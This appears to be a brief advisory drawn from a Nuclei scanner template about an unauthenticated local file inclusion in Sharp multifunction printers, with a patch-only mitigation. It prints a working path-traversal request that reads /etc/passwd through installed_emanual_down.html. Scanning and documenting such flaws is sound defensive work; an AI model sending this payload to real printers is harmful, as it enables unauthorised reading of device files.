# Vulnerability: Sharp Multifunction Printers - Local File Inclusion
**Classification:** SHARP
**Source:** Nuclei Template (`sharp-printers-lfi.yaml`)

## Description
It was observed that Sharp printers are vulnerable to a local file inclusion without authentication. Any attacker can read any file located in the printer.

## Secure Mitigation
Apply all relevant security patches and product upgrades.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/installed_emanual_down.html?path=/manual/../../../etc/passwd
```

